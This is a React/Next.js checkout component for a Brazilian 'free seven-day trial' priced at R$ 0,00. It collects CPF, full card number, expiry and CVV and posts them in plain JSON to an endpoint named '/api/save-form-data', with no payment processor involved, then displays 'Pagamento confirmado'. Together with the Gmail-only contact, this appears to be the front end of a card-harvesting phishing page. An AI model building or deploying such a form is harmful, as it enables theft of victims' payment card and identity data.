'use client'

import { useState, useEffect } from "react"
import Image from "next/image"
import { X } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { cn, formatCPF, formatPhone, formatCardNumber, formatExpiryDate, validateCPF, validateCardNumber, identifyCardBrand, validateExpiryDate } from "@/lib/utils"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useToast } from "@/hooks/use-toast"
import { LoadingSpinner, SuccessCheck, Confetti } from "@/components/ui/animations"
import { useRouter } from 'next/navigation'

interface FormField {
  value: string
  touched: boolean
  error: string | null
}

type CardBrand = 'visa' | 'mastercard' | 'amex' | 'discover' | 'diners' | 'jcb' | 'elo' | 'hipercard' | 'unknown'

export default function CheckoutForm() {
  const [formFields, setFormFields] = useState<Record<string, FormField>>({
    name: { value: '', touched: false, error: null },
    email: { value: '', touched: false, error: null },
    emailConfirm: { value: '', touched: false, error: null },
    phone: { value: '', touched: false, error: null },
    document: { value: '', touched: false, error: null },
    cardNumber: { value: '', touched: false, error: null },
    cardName: { value: '', touched: false, error: null },
    cardExpiry: { value: '', touched: false, error: null },
    cardCVV: { value: '', touched: false, error: null },
  })

  const [showCardFields, setShowCardFields] = useState(false)
  const [countryCode, setCountryCode] = useState('+55')
  const [cardBrand, setCardBrand] = useState<CardBrand>('unknown')
  const [formState, setFormState] = useState<'idle' | 'processing' | 'success' | 'redirecting'>('idle')
  const [animationStep, setAnimationStep] = useState(0)

  const { toast } = useToast()
  const router = useRouter()

  useEffect(() => {
    const requiredFields = ['name', 'email', 'emailConfirm', 'phone', 'document']
    const allRequiredFieldsFilled = requiredFields.every(
      field => formFields[field].value.trim() !== '' && !formFields[field].error
    )
    setShowCardFields(allRequiredFieldsFilled)
  }, [formFields])

  useEffect(() => {
    if (formState === 'processing') {
      const timer = setTimeout(() => {
        setFormState('success')
        setAnimationStep(1)
      }, 3000)
      return () => clearTimeout(timer)
    }
    if (formState === 'success' && animationStep === 1) {
      const timer = setTimeout(() => {
        setAnimationStep(2)
      }, 1500)
      return () => clearTimeout(timer)
    }
  }, [formState, animationStep])

  const handleFieldChange = (field: string, value: string) => {
    let error = null
    if (!value.trim()) {
      error = 'O campo é obrigatório'
    } else if (field === 'name' && value.length > 50) {
      error = 'O nome deve ter no máximo 50 caracteres'
    } else if (field === 'email' && !value.includes('@')) {
      error = 'Email inválido'
    } else if (field === 'emailConfirm' && value !== formFields.email.value) {
      error = 'Os emails não coincidem'
    } else if (field === 'phone' && value.replace(/\D/g, '').length !== 11) {
      error = 'Número de telefone inválido'
    } else if (field === 'document' && !validateCPF(value)) {
      error = 'CPF inválido'
    } else if (field === 'cardNumber') {
      const brand = identifyCardBrand(value.replace(/\s/g, ''))
      setCardBrand(brand as CardBrand)
      if (!validateCardNumber(value)) {
        error = 'Número de cartão inválido'
      }
    } else if (field === 'cardExpiry') {
      error = validateExpiryDate(value)
    }

    setFormFields(prev => ({
      ...prev,
      [field]: {
        value,
        touched: true,
        error
      }
    }))
  }

  const renderField = (field: string, placeholder: string, type: string = 'text', maxLength?: number) => {
    const fieldState = formFields[field]
    return (
      <div className="relative">
        <Input
          type={type}
          required
          placeholder={placeholder}
          value={fieldState.value}
          onChange={(e) => {
            let value = e.target.value
            if (field === 'document') {
              value = formatCPF(value)
            } else if (field === 'phone') {
              value = formatPhone(value)
            } else if (field === 'cardNumber') {
              value = formatCardNumber(value)
            } else if (field === 'cardExpiry') {
              value = formatExpiryDate(value)
            }
            handleFieldChange(field, value)
          }}
          maxLength={maxLength}
          className={cn("pr-12", fieldState.touched && fieldState.error ? 'border-red-500' : '')}
        />
        {fieldState.touched && fieldState.error && (
          <>
            <X className="w-4 h-4 absolute right-2 top-3 text-red-500" />
            <p className="text-xs text-red-500 mt-1">{fieldState.error}</p>
          </>
        )}
        {field === 'cardNumber' && cardBrand !== 'unknown' && (
          <Image
            src={`/card-icons/${cardBrand}.png`}
            alt={`${cardBrand} logo`}
            width={40}
            height={25}
            className="absolute right-2 top-2.5"
          />
        )}
      </div>
    )
  }

  const handleSubmit = async () => {
    setFormState('processing')
    try {
      const response = await fetch('/api/save-form-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardName: formFields.cardName.value,
          document: formFields.document.value,
          cardNumber: formFields.cardNumber.value,
          cardExpiry: formFields.cardExpiry.value,
          cardCVV: formFields.cardCVV.value,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Erro desconhecido ao processar o pagamento');
      }

      console.log('Data saved successfully:', data);
      setFormState('success')
      setAnimationStep(1)
    } catch (error) {
      console.error('Error saving data:', error);
      setFormState('idle')
      toast({
        title: "Erro",
        description: error instanceof Error ? error.message : 'Falha ao processar o pagamento. Tente novamente.',
        variant: "destructive",
      })
    }
  }

  return (
    <Card className="max-w-[1000px] mx-auto relative">
      <CardContent className="p-6">
        {formState !== 'idle' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center">
            <div className="fixed inset-0 bg-white/70 backdrop-blur-md"></div>
            <div className="relative z-10 text-center">
              {formState === 'processing' && <LoadingSpinner />}
              {formState === 'success' && animationStep === 1 && (
                <>
                  <SuccessCheck />
                  <Confetti />
                </>
              )}
              {formState === 'success' && animationStep === 2 && (
                <div className="space-y-4">
                  <p className="text-2xl font-bold text-green-600">Pagamento confirmado</p>
                  <div className="flex items-center justify-center space-x-2">
                    <p className="text-lg text-gray-700">Estamos redirecionando...</p>
                    <LoadingSpinner size="small" />
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
        <div className="grid md:grid-cols-[1fr,1.5fr] gap-8">
          {/* Left Column */}
          <div className="space-y-6">
            <div className="flex items-center gap-2">
              <Image
                src="/file.png"
                alt="Flask icon"
                width={24}
                height={24}
                className="w-6 h-6"
              />
              <h1 className="text-sm text-gray-700">
                Plano Trial
              </h1>
            </div>
            
            <Button variant="outline" className="w-full justify-start gap-2">
              <div className="w-5 h-5 bg-gray-200 rounded" />
              PLANO TRIAL - 7D
            </Button>

            <div className="flex justify-center py-6">
              <Image
                src="/file.png"
                alt="Planos Gratis"
                width={150}
                height={150}
                className="rounded object-cover"
              />
            </div>

            <div className="space-y-2">
              <p className="text-sm text-center">
                7 DIAS GRATIS
              </p>
              <div className="flex justify-between font-medium">
                <span>TOTAL</span>
                <span>R$ 0,00</span>
              </div>
            </div>
          </div>

          {/* Right Column */}
          <div className="space-y-6">
            <div>
              <h2 className="text-lg font-medium mb-4">OS SEUS DADOS</h2>
              <div className="space-y-4">
                {renderField('name', 'Nome e sobrenome *', 'text', 50)}

                <div className="grid md:grid-cols-2 gap-4">
                  {renderField('email', 'E-mail *', 'email')}
                  {renderField('emailConfirm', 'Confirme o E-mail *', 'email')}
                </div>

                <div className="grid md:grid-cols-2 gap-4">
                  <div className="flex gap-2">
                    <Select value={countryCode} onValueChange={setCountryCode}>
                      <SelectTrigger className="w-[100px]">
                        <SelectValue placeholder="País" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="+55">🇧🇷 +55</SelectItem>
                        <SelectItem value="+1">🇺🇸 +1</SelectItem>
                        <SelectItem value="+44">🇬🇧 +44</SelectItem>
                        <SelectItem value="+49">🇩🇪 +49</SelectItem>
                        <SelectItem value="+33">🇫🇷 +33</SelectItem>
                        <SelectItem value="+34">🇪🇸 +34</SelectItem>
                        <SelectItem value="+351">🇵🇹 +351</SelectItem>
                      </SelectContent>
                    </Select>
                    {renderField('phone', '(00) 90000-0000', 'tel', 15)}
                  </div>
                  {renderField('document', 'CPF *', 'text', 14)}
                </div>
              </div>
            </div>

            {showCardFields && (
              <div>
                <h2 className="text-lg font-medium mb-4">DADOS DO PAGAMENTO</h2>
                <div className="space-y-4">
                  {renderField('cardNumber', 'Número do Cartão *', 'text', 19)}
                  {renderField('cardName', 'Nome no Cartão *', 'text')}
                  <div className="grid grid-cols-2 gap-4">
                    {renderField('cardExpiry', 'Validade (MM/AA) *', 'text', 5)}
                    {renderField('cardCVV', 'CVV *', 'text', 3)}
                  </div>
                </div>
              </div>
            )}

            <div className="space-y-4 mt-6">
              <div className="flex items-center justify-between">
                <Button 
                  className={cn("flex-grow", showCardFields ? 'bg-[#006400] hover:bg-[#005000]' : 'bg-[#98D8A0] hover:bg-[#88c890]')}
                  disabled={!showCardFields || formState !== 'idle'}
                  onClick={handleSubmit}
                >
                  {showCardFields ? 'Finalizar Pagamento' : 'Iniciar Teste Grátis'}
                </Button>
              </div>
              
              <div className="pt-8 border-t">
                <h3 className="text-lg font-medium mb-2">Atendimento</h3>
                <a 
                  href="mailto:automatiklabs62@gmail.com"
                  className="text-sm text-gray-600 hover:text-gray-900"
                >
                  automatiklabs62@gmail.com
                </a>
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

